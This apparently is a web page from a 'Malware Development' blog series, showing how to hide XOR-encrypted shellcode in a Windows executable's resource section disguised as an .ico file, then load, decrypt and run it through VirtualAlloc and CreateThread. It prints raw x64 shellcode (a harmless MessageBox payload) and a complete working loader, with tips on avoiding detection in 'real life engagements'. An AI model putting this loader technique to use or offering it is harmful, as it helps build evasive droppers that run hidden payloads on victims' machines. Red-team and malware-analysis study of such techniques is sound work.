# https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-03/

<!DOCTYPE html><!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
--><html lang="en" class=" js "><body class="layout--single wide"><a href="https://buymeacoffee.com/ry0d4n" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;"></a>


  

  
    

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  



  <article class="page" itemscope="" itemtype="https://schema.org/CreativeWork">
    
    
    
    

    <div class="page__inner-wrap">
      
        
      

      <section class="page__content" itemprop="text">
        
          
        
        <h1 id="payload-placement-rsrc-section">Payload placement: .rsrc section<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-03/#payload-placement-rsrc-section" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>This is a popular way of placement used widely among malware authors,
The resource section of the executable is a section that is meant to store non-executable files, icon files, bitmaps and so on.</p>

<p>Malware authors tend to use it to store their payload but mostly in an encrypted form, that provides a level of obscurity, Also most malware families nowadays has many versions or releases, and having a payload in resource section makes it easy for a malware author to modify the functionality of the payload, he will simply need to just change the resources content, and not the code itself.</p>

<p>For this article we’ll work with a <strong>MessageBox</strong> payload we have been using earlier, but this time let’s append a simple layer of obfuscation, take this payload, XOR it with the value: “<strong>XYZ</strong>” and save the file as a <code class="language-plaintext highlighter-rouge">.ico</code>.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> 
<span class="s">"</span><span class="se">\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x4c\x8d\x85\x15\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xd5\x43\x52\x41\x46\x54\x49\x4e\x47\x20\x44\x49\x47\x49</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x54\x41\x4c\x20\x43\x48\x41\x4f\x53\x00\x4d\x65\x73\x73</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x61\x67\x65\x42\x6f\x78\x00</span><span class="s">"</span><span class="p">;</span>
</code></pre></div></div>

<h1 id="adding-a-resource-to-our-project">Adding a resource to our project<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-03/#adding-a-resource-to-our-project" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>Click on  <strong>Resources File</strong> -&gt; <strong>Add</strong> -&gt; <strong>Netw Item</strong>
<img src="https://ry0dan.github.io/assets/images/malware-development/3-0.png" alt="P1"></p>

<p>Choose <strong>Resource File</strong> and once you get a column on the right hand side right clikc on Resource.rc and add the resource -&gt; import your .ico and specify its type as <code class="language-plaintext highlighter-rouge">RCDATA</code>.</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/3-1.png" alt="P2">
<img src="https://ry0dan.github.io/assets/images/malware-development/3-2.png" alt="P3"></p>

<p>After we have added our encrypted .ico file we need to be able to retrieve its contents in order to decrypt it and finally execute it.</p>

<h1 id="retrieving-payload-contents">Retrieving payload contents<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-03/#retrieving-payload-contents" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>Our process will be as follows:</p>

<ul>
  <li><strong>FindResourceW</strong> API call: locate the resource using its ID and type.</li>
  <li><strong>LoadResource</strong> API call: Load the contents of our resource file to memory.</li>
  <li><strong>LockResource</strong> API call: obtain a pointer to the data.</li>
  <li>Allocate memory out of .rsrc section and copy our data.</li>
  <li>Begin execution.</li>
</ul>

<h2 id="locating-resource">Locating resource<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-03/#locating-resource" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HRSRC</span> <span class="n">hRsrc</span> <span class="o">=</span> <span class="n">FindResourceW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="n">MAKEINTRESOURCE</span><span class="p">(</span><span class="n">IDR_RCDATA1</span><span class="p">),</span> <span class="n">RT_RCDATA</span><span class="p">);</span>
</code></pre></div></div>
<p>“HRSRC” type stands for “Handle to a Resource.” It represents a handle to a resource that is loaded, and The <code class="language-plaintext highlighter-rouge">MAKEINTRESOURCE</code> macro is a utility macro for converting an integer value into a resource identifier at this case we passed <code class="language-plaintext highlighter-rouge">IDR_RCDATA1</code> which is teh ID of our resource, we can find the ID in the <code class="language-plaintext highlighter-rouge">resource.h</code> file (<strong>Do not forget to include it</strong>).
<img src="https://ry0dan.github.io/assets/images/malware-development/3-4.png" alt="P4"></p>

<p>The last parameter is just the type of the resource and we specified that earlier when we first imported our resource.</p>

<h2 id="loading-resource-contents">Loading resource contents<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-03/#loading-resource-contents" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>We use this code and pass the handle we got above:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HGLOBAL</span> <span class="n">hGRsrc</span> <span class="o">=</span> <span class="n">LoadResource</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">hRsrc</span><span class="p">);</span>
</code></pre></div></div>
<h2 id="obtain-a-pointer">Obtain a pointer<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-03/#obtain-a-pointer" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PVOID</span> <span class="n">RsrcAd</span> <span class="o">=</span> <span class="n">LockResource</span><span class="p">(</span><span class="n">hGRsrc</span><span class="p">);</span>
</code></pre></div></div>
<p>The variable <strong>RsrcAd</strong> will point to our data, but it will still be a pointer inside .rsrc section, to do any operations on the data such as writing, decrypting, executing, etc. We better allocate a memory region and copy our data to that region.</p>

<p>For this we can simply use <strong>VirtualAlloc()</strong> or any other memory allocation API.</p>

<h2 id="decrypting-the-payload">Decrypting the payload<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-03/#decrypting-the-payload" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>Before allocating memory we need to calculate the size of our resource:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="n">dwSize</span> <span class="o">=</span> <span class="n">SizeofResource</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">hRsrc</span><span class="p">);</span>
</code></pre></div></div>
<p>Then using <strong>VirtualAlloc()</strong>.</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PVOID</span> <span class="n">pAddress</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
</code></pre></div></div>

<blockquote>
  <p>Again: passing <strong>PAGE_EXECUTE_READWRITE</strong> is a big red flag, this is usually not the best way to do memory allocation, instead in real life engagements we better use <strong>PAGE_READWRITE</strong> then changing the memory protection using <strong>VitualProtect()</strong>.</p>
</blockquote>

<p>Then copy the data to that region:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">memcpy</span><span class="p">(</span><span class="n">pAddress</span><span class="p">,</span> <span class="n">RsrcAd</span><span class="p">,</span> <span class="n">dwSize</span><span class="p">);</span>
</code></pre></div></div>
<p>We need to implement a function that will take the encrypted data, the key and decrypt our payload:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">VOID</span> <span class="nf">XOR</span><span class="p">(</span><span class="n">IN</span> <span class="n">PBYTE</span> <span class="n">pBytes</span><span class="p">,</span> <span class="n">IN</span> <span class="n">DWORD</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">IN</span> <span class="kt">char</span><span class="o">*</span> <span class="n">pKey</span><span class="p">)</span> <span class="p">{</span>

  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">dwSize</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">pBytes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">pBytes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">pKey</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">3</span><span class="p">];</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Pass the address and key to decrypt:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"XYZ"</span><span class="p">;</span> 
<span class="n">XOR</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pAddress</span><span class="p">,</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>
</code></pre></div></div>

<h1 id="execution" class="active">Execution<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-03/#execution" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>After we have prepared everything let’s do a quick test to see the payload before and after decryption, make sure it is decrypted successfully.</p>

<p>toggle a breakpoint before and after the XOR operation and check the payload in memory:
Before:</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/3-5.png" alt="P5"></p>

<p>After:</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/3-6.png" alt="P6"></p>

<p>Now as we see, we have successfully decrypted our payload, and already it’s in an executable region of memory, we can simply execute it now with <strong>CreateThread()</strong> API call.</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">pAddress</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"CreateThread Failed with Error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="p">};</span>
</code></pre></div></div>
<p>And always remember to trace the execution using a debugger to confirm everything is working properly :) .
<img src="https://ry0dan.github.io/assets/images/malware-development/3-7.png" alt="P6">
Final Code:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"resource.h"</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="n">VOID</span> <span class="nf">XOR</span><span class="p">(</span><span class="n">IN</span> <span class="n">PBYTE</span> <span class="n">pBytes</span><span class="p">,</span> <span class="n">IN</span> <span class="n">DWORD</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">IN</span> <span class="kt">char</span><span class="o">*</span> <span class="n">pKey</span><span class="p">)</span> <span class="p">{</span>

  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">dwSize</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">pBytes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">pBytes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">pKey</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">3</span><span class="p">];</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="n">main</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">HRSRC</span> <span class="n">hRsrc</span> <span class="o">=</span> <span class="n">FindResourceW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">MAKEINTRESOURCE</span><span class="p">(</span><span class="n">IDR_RCDATA1</span><span class="p">),</span> <span class="n">RT_RCDATA</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">hRsrc</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"FindResouceW failed with error: %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">HGLOBAL</span> <span class="n">hGRsrc</span> <span class="o">=</span> <span class="n">LoadResource</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">hRsrc</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">hGRsrc</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"LoadResource failed with error: %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">PVOID</span> <span class="n">RsrcAd</span> <span class="o">=</span> <span class="n">LockResource</span><span class="p">(</span><span class="n">hGRsrc</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">RsrcAd</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"failed loading resource, error: %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">DWORD</span> <span class="n">dwSize</span> <span class="o">=</span> <span class="n">SizeofResource</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">hRsrc</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">dwSize</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"SizeofResource failed with error: %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">PVOID</span> <span class="n">pAddress</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

  <span class="n">memcpy</span><span class="p">(</span><span class="n">pAddress</span><span class="p">,</span> <span class="n">RsrcAd</span><span class="p">,</span> <span class="n">dwSize</span><span class="p">);</span>

  <span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"XYZ"</span><span class="p">;</span>
  
  <span class="n">XOR</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pAddress</span><span class="p">,</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>
  
  <span class="k">if</span> <span class="p">(</span><span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">pAddress</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"CeateThread Failed with Error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="p">};</span>

  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

        
      </section>

      

      

      
  

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term...">
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    

    
  
  














  

</body></html>